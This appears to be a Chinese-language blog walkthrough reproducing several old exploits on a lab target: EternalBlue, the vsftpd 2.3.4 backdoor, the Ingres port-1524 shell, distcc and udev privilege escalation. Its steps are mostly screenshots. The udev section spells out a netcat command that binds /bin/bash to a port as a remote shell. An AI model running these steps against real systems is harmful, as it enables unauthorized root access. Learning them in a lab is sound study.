## 漏洞复现

### 1\. 永恒之蓝（445端口）

首先先搜索ms17_010

[![wps186](https://image.3001.net/images/20201116/1605508995.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112753048-222645575.jpg)

use 2 选择编号二的

[![wps187](https://image.3001.net/images/20201116/1605508995.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112753750-653885983.jpg)

查看需要的参数

[![wps188](https://image.3001.net/images/20201116/1605508996.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112754606-564499798.jpg)

设置目标ip地址

[![wps189](https://image.3001.net/images/20201116/1605508996.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112755272-758725221.jpg)

run 启动攻击成功

[![wps190](https://image.3001.net/images/20201116/1605508997.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112755878-2018595301.jpg)

### 2\. 手动微笑漏洞（21端口 vsftpd2.3.4版本）

扫描到对方打开21号端口并且版本为vsftpd 2.3.4的

[![wps191](https://image.3001.net/images/20201116/1605508997.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112756807-157170179.jpg)

ftp跟上目标机的ip地址，帐号为root:) 密码为root ， 他就会停在那边

（或者search vsftpd直接利用漏洞）

[![wps192](https://image.3001.net/images/20201116/1605508998.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112757599-1731864178.jpg)

重新开个终端用nc连接该ip地址的6200端口（成功连接，并且是root权限）

[![wps193](https://image.3001.net/images/20201116/1605508998.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112758249-841801005.jpg)

### 3\. ingres数据库DBMS后门（1524端口）

扫描端口发现有1524端口的开放

[![wps194](https://image.3001.net/images/20201116/1605508999.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112758991-950628823.jpg)

直接telnet进行连接该ip的1524端口（直接获得root用户权限）

[![wps195](https://image.3001.net/images/20201116/1605509000.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112759838-1742086019.jpg)

  

### 4\. distcc漏洞（3632）

msf搜索distcc，并进入该模块

查看所要参数，并设置目标ip

[![wps197](https://image.3001.net/images/20201116/1605509000.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112801194-1440545719.jpg)

启用失败（跟环境有关，靶机需要开启3632端口）

[![wps198](https://image.3001.net/images/20201116/1605509001.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112801885-750629785.jpg)

### 5\. udev提权

searchsploit udev + locate 搜索加定位

[![wps199](https://image.3001.net/images/20201116/1605509001.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112802645-523325281.jpg)

进入shell

cat /proc/net/netlink -->记录udev pid

[![wps200](https://image.3001.net/images/20201116/1605509002.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112803338-84908189.jpg)

切换到/tmp文件下

[![wps201](https://image.3001.net/images/20201116/1605509002.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112804078-2027788309.jpg)

touch run

echo '#!/bin/bash'> run

echo '/bin/netcat -Ivvp 4445 -e /bin/bash' >> run

[![wps202](https://image.3001.net/images/20201116/1605509003.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112804761-995411040.jpg)

将文件移动到/var/www/html文件夹下

[![wps203](https://image.3001.net/images/20201116/1605509003.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112805522-500108127.jpg)

下载并且编译gcc udev.c -0 udev

[![wps204](https://image.3001.net/images/20201116/1605509004.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112806173-1805074453.jpg)

./udev pid

[![wps205](https://image.3001.net/images/20201116/1605509004.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112807111-521154641.jpg)

连接成功

[![wps206](https://image.3001.net/images/20201116/1605509005.jpg!small)](https://img2020.cnblogs.com/blog/2209303/202011/2209303-20201111112807726-1133847929.jpg)

